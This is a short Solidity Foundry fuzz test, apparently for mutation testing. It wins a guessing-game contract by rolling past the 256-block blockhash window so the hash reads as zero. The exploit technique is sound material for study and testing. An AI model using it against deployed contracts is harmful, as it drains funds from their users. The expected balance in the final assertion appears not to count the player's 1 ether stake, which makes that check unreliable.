pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {C} from "../src/C_under_test.sol";

contract InvMutTest is Test {
    C c;

    function setUp() public {
        c = new C{value: 1 ether}();
    }

    function testFuzz_property(address actor, uint256 jump) public {
        vm.assume(actor != address(0) && actor != address(c));
        // Roll far past the 256-block hash window so blockhash(target) == 0,
        // making the winning answer predictable: keccak256(abi.encodePacked(bytes32(0)))
        jump = bound(jump, 300, 1_000_000);

        // Fund the contract so it can pay out, and fund the player
        vm.deal(address(c), 5 ether);
        vm.deal(actor, 1 ether);

        bytes32 winningGuess = keccak256(abi.encodePacked(bytes32(0)));
        vm.prank(actor);
        c.lockInGuess{value: 1 ether}(winningGuess);

        // Advance well beyond the target block so its blockhash reads as 0
        vm.roll(block.number + jump);

        vm.prank(actor);
        c.settle();

        // General rule: a winning settle always pays out exactly 2 ether.
        assertTrue(
            address(c).balance == 5 ether - 2 ether,
            "winning settle must transfer 2 ether out of the contract"
        );
    }
}

